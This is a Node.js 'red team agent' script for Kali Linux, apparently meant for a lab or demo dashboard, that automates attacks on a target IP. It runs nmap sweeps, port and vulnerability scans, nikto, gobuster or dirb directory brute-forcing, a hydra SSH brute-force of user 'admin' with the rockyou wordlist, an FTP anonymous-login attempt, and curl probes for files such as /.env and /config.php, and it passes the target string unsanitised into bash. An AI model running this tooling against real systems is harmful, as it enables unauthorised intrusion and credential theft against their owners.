#!/usr/bin/env node
// ============================================================
// RED TEAM AGENT — Runs on Kali Linux
// Executes real penetration testing tools against target
// Usage: node red-agent.js --target 192.168.56.102 --dashboard ws://HOST_IP:3000/ws
// ============================================================

const { execSync, spawn } = require('child_process');
const WebSocket = require('ws');

// ---- Config ----
const args = process.argv.slice(2);
const getArg = (flag, def) => { const i = args.indexOf(flag); return i !== -1 && args[i + 1] ? args[i + 1] : def; };

const TARGET_IP = getArg('--target', '192.168.56.102');
const DASHBOARD_WS = getArg('--dashboard', 'ws://192.168.56.1:3000/ws');
const AGENT_PORT = parseInt(getArg('--port', '4001'));

const MSG_TYPES = {
    HANDSHAKE: 'handshake', STATUS: 'status', HEARTBEAT: 'heartbeat',
    ATTACK_START: 'attack_start', ATTACK_RESULT: 'attack_result',
    ATTACK_OUTPUT: 'attack_output', SCAN_RESULT: 'scan_result',
    COMMAND: 'command'
};

// ---- WebSocket Server (for dashboard to connect) ----
let dashboardWs = null;
const wss = new WebSocket.Server({ port: AGENT_PORT });

console.log(`[RED AGENT] Starting on port ${AGENT_PORT}`);
console.log(`[RED AGENT] Target: ${TARGET_IP}`);

wss.on('connection', (ws) => {
    console.log('[RED AGENT] Dashboard connected');
    dashboardWs = ws;

    send(MSG_TYPES.HANDSHAKE, 'Red Team Agent connected', {
        agent: 'red', target: TARGET_IP, tools: getAvailableTools()
    });

    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw);
            if (msg.type === MSG_TYPES.COMMAND) {
                handleCommand(msg);
            }
        } catch (e) {
            console.error('[RED AGENT] Bad message:', e.message);
        }
    });

    ws.on('close', () => {
        console.log('[RED AGENT] Dashboard disconnected');
        dashboardWs = null;
    });
});

function send(type, message, data = {}, severity = 'info') {
    if (!dashboardWs || dashboardWs.readyState !== WebSocket.OPEN) return;
    dashboardWs.send(JSON.stringify({
        type, team: 'red', source: 'red_agent', message, severity, data,
        timestamp: Date.now()
    }));
}

// ---- Tool Detection ----
function checkTool(name) {
    try { execSync(`which ${name}`, { stdio: 'ignore' }); return true; }
    catch { return false; }
}

function getAvailableTools() {
    const tools = ['nmap', 'hydra', 'nikto', 'gobuster', 'searchsploit', 'curl', 'dirb', 'sqlmap', 'whatweb'];
    return tools.filter(t => checkTool(t));
}

// ---- Attack Modules ----
function runCommand(cmd, timeout = 120000) {
    return new Promise((resolve) => {
        let output = '';
        let error = '';

        const proc = spawn('bash', ['-c', cmd], { timeout });

        proc.stdout.on('data', (chunk) => {
            const text = chunk.toString();
            output += text;
            // Stream live output
            send(MSG_TYPES.ATTACK_OUTPUT, text.trim().substring(0, 500), {}, 'info');
        });

        proc.stderr.on('data', (chunk) => {
            error += chunk.toString();
        });

        proc.on('close', (code) => {
            resolve({ output: output.trim(), error: error.trim(), exitCode: code });
        });

        proc.on('error', (err) => {
            resolve({ output: '', error: err.message, exitCode: -1 });
        });
    });
}

// --- Recon Modules ---
async function networkSweep() {
    send(MSG_TYPES.ATTACK_START, `[RECON] Network sweep on ${TARGET_IP}/24`, { phase: 'recon', action: 'network_sweep' }, 'warning');
    const subnet = TARGET_IP.split('.').slice(0, 3).join('.') + '.0/24';
    const result = await runCommand(`nmap -sn ${subnet} 2>/dev/null | grep -E "scan report|Host is"`, 30000);
    const hosts = (result.output.match(/scan report for/g) || []).length;
    send(MSG_TYPES.ATTACK_RESULT, `Network sweep complete -- ${hosts} live hosts discovered`, {
        phase: 'recon', action: 'network_sweep', success: true, hosts, raw: result.output.substring(0, 2000)
    }, 'info');
    return result;
}

async function portScan() {
    send(MSG_TYPES.ATTACK_START, `[RECON] Port scan on ${TARGET_IP}`, { phase: 'recon', action: 'port_scan' }, 'warning');
    const result = await runCommand(`nmap -sV -sC --top-ports 1000 ${TARGET_IP} 2>/dev/null`, 120000);
    const openPorts = (result.output.match(/\d+\/tcp\s+open/g) || []);
    send(MSG_TYPES.ATTACK_RESULT, `Port scan complete -- ${openPorts.length} open ports found`, {
        phase: 'recon', action: 'port_scan', success: true,
        ports: openPorts.map(p => p.split('/')[0]),
        raw: result.output.substring(0, 3000)
    }, 'info');
    return result;
}

async function serviceEnum() {
    send(MSG_TYPES.ATTACK_START, `[RECON] Service enumeration on ${TARGET_IP}`, { phase: 'recon', action: 'service_enum' }, 'warning');
    const result = await runCommand(`nmap -sV -O ${TARGET_IP} 2>/dev/null`, 90000);
    send(MSG_TYPES.ATTACK_RESULT, `Service enumeration complete`, {
        phase: 'recon', action: 'service_enum', success: true, raw: result.output.substring(0, 3000)
    }, 'info');
    return result;
}

async function vulnScan() {
    send(MSG_TYPES.ATTACK_START, `[RECON] Vulnerability scan on ${TARGET_IP}`, { phase: 'recon', action: 'vuln_scan' }, 'warning');
    const result = await runCommand(`nmap --script vuln ${TARGET_IP} 2>/dev/null`, 180000);
    const vulns = (result.output.match(/VULNERABLE/gi) || []).length;
    send(MSG_TYPES.ATTACK_RESULT, `Vulnerability scan complete -- ${vulns} potential vulnerabilities`, {
        phase: 'recon', action: 'vuln_scan', success: true, vulnCount: vulns, raw: result.output.substring(0, 3000)
    }, vulns > 0 ? 'warning' : 'info');
    return result;
}

async function webScan() {
    if (!checkTool('nikto')) {
        send(MSG_TYPES.ATTACK_RESULT, `nikto not available, skipping web scan`, { phase: 'recon', action: 'web_scan', success: false }, 'info');
        return null;
    }
    send(MSG_TYPES.ATTACK_START, `[RECON] Web vulnerability scan on ${TARGET_IP}`, { phase: 'recon', action: 'web_scan' }, 'warning');
    const result = await runCommand(`nikto -h ${TARGET_IP} -maxtime 60s 2>/dev/null`, 90000);
    send(MSG_TYPES.ATTACK_RESULT, `Web scan complete`, {
        phase: 'recon', action: 'web_scan', success: true, raw: result.output.substring(0, 3000)
    }, 'info');
    return result;
}

async function dirBrute() {
    const tool = checkTool('gobuster') ? 'gobuster' : checkTool('dirb') ? 'dirb' : null;
    if (!tool) {
        send(MSG_TYPES.ATTACK_RESULT, `No directory brute-force tool available`, { success: false }, 'info');
        return null;
    }
    send(MSG_TYPES.ATTACK_START, `[RECON] Directory brute-force on ${TARGET_IP}`, { phase: 'recon', action: 'dir_brute' }, 'warning');

    let cmd;
    if (tool === 'gobuster') {
        cmd = `gobuster dir -u http://${TARGET_IP} -w /usr/share/wordlists/dirb/common.txt -t 20 -q 2>/dev/null | head -30`;
    } else {
        cmd = `dirb http://${TARGET_IP} /usr/share/wordlists/dirb/common.txt -S -r 2>/dev/null | head -40`;
    }

    const result = await runCommand(cmd, 90000);
    const dirs = (result.output.match(/Status: 200|FOUND/g) || []).length;
    send(MSG_TYPES.ATTACK_RESULT, `Directory brute-force complete -- ${dirs} paths found`, {
        phase: 'recon', action: 'dir_brute', success: true, dirs, raw: result.output.substring(0, 2000)
    }, 'info');
    return result;
}

// --- Exploit Modules ---
async function sshBruteForce() {
    if (!checkTool('hydra')) {
        send(MSG_TYPES.ATTACK_RESULT, `hydra not available, skipping SSH brute-force`, { success: false }, 'info');
        return null;
    }
    send(MSG_TYPES.ATTACK_START, `[EXPLOIT] SSH brute-force on ${TARGET_IP}`, { phase: 'exploit', action: 'ssh_bruteforce' }, 'error');

    // Use small wordlist for demo speed
    const result = await runCommand(
        `hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V ${TARGET_IP} ssh 2>/dev/null | tail -20`,
        120000
    );

    const success = result.output.includes('successfully completed') || result.output.includes('valid password');
    send(MSG_TYPES.ATTACK_RESULT, success
        ? `SSH brute-force SUCCESSFUL -- credentials found!`
        : `SSH brute-force failed -- no valid credentials in wordlist`, {
        phase: 'exploit', action: 'ssh_bruteforce', success,
        raw: result.output.substring(0, 2000)
    }, success ? 'critical' : 'warning');
    return result;
}

async function ftpBruteForce() {
    if (!checkTool('hydra')) return null;
    send(MSG_TYPES.ATTACK_START, `[EXPLOIT] FTP brute-force on ${TARGET_IP}`, { phase: 'exploit', action: 'ftp_bruteforce' }, 'error');

    const result = await runCommand(
        `hydra -l anonymous -p anonymous -f ${TARGET_IP} ftp 2>/dev/null`,
        30000
    );

    const success = result.output.includes('successfully completed') || result.output.includes('valid password');
    send(MSG_TYPES.ATTACK_RESULT, success
        ? `FTP anonymous login SUCCESSFUL`
        : `FTP anonymous login failed`, {
        phase: 'exploit', action: 'ftp_bruteforce', success,
        raw: result.output.substring(0, 1000)
    }, success ? 'critical' : 'info');
    return result;
}

async function httpExploit() {
    send(MSG_TYPES.ATTACK_START, `[EXPLOIT] HTTP enumeration on ${TARGET_IP}`, { phase: 'exploit', action: 'http_exploit' }, 'error');

    // Check common vulnerable paths
    const paths = ['/admin', '/login', '/wp-admin', '/phpmyadmin', '/.env', '/config.php', '/robots.txt', '/server-status'];
    const found = [];

    for (const path of paths) {
        try {
            const result = await runCommand(`curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 http://${TARGET_IP}${path}`, 5000);
            const code = result.output.trim();
            if (code === '200' || code === '301' || code === '302' || code === '403') {
                found.push({ path, status: code });
                send(MSG_TYPES.ATTACK_OUTPUT, `Found: ${path} [${code}]`, {}, 'warning');
            }
        } catch { }
    }

    send(MSG_TYPES.ATTACK_RESULT, `HTTP enumeration complete -- ${found.length} interesting paths found`, {
        phase: 'exploit', action: 'http_exploit', success: found.length > 0,
        paths: found
    }, found.length > 0 ? 'warning' : 'info');
}

// ---- Command Handler ----
async function handleCommand(msg) {
    const cmd = msg.data?.command;
    console.log(`[RED AGENT] Received command: ${cmd}`);

    switch (cmd) {
        case 'run_full_attack':
            await runFullAttack();
            break;
        case 'recon_only':
            await runRecon();
            break;
        case 'exploit_only':
            await runExploits();
            break;
        case 'network_sweep':
            await networkSweep();
            break;
        case 'port_scan':
            await portScan();
            break;
        case 'vuln_scan':
            await vulnScan();
            break;
        case 'ssh_brute':
            await sshBruteForce();
            break;
        case 'web_scan':
            await webScan();
            break;
        case 'status':
            send(MSG_TYPES.STATUS, 'Red Agent active', { target: TARGET_IP, tools: getAvailableTools() });
            break;
        default:
            send(MSG_TYPES.ATTACK_RESULT, `Unknown command: ${cmd}`, {}, 'warning');
    }
}

// ---- Attack Sequences ----
async function runRecon() {
    send(MSG_TYPES.STATUS, '=== RECONNAISSANCE PHASE STARTING ===', { phase: 'recon' }, 'warning');
    await networkSweep();
    await sleep(2000);
    await portScan();
    await sleep(2000);
    await serviceEnum();
    await sleep(2000);
    await vulnScan();
    await sleep(2000);
    await webScan();
    await sleep(1000);
    await dirBrute();
    send(MSG_TYPES.STATUS, '=== RECONNAISSANCE PHASE COMPLETE ===', { phase: 'recon' }, 'info');
}

async function runExploits() {
    send(MSG_TYPES.STATUS, '=== EXPLOITATION PHASE STARTING ===', { phase: 'exploit' }, 'error');
    await sshBruteForce();
    await sleep(3000);
    await ftpBruteForce();
    await sleep(2000);
    await httpExploit();
    send(MSG_TYPES.STATUS, '=== EXPLOITATION PHASE COMPLETE ===', { phase: 'exploit' }, 'warning');
}

async function runFullAttack() {
    send(MSG_TYPES.STATUS, '=== FULL ATTACK SEQUENCE INITIATED ===', { phase: 'all' }, 'error');
    await runRecon();
    await sleep(3000);
    await runExploits();
    send(MSG_TYPES.STATUS, '=== FULL ATTACK SEQUENCE COMPLETE ===', { phase: 'all' }, 'info');
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ---- Heartbeat ----
setInterval(() => {
    send(MSG_TYPES.HEARTBEAT, 'alive', { target: TARGET_IP });
}, 10000);

console.log(`[RED AGENT] Ready. Waiting for dashboard connection on port ${AGENT_PORT}...`);
console.log(`[RED AGENT] Available tools: ${getAvailableTools().join(', ')}`);
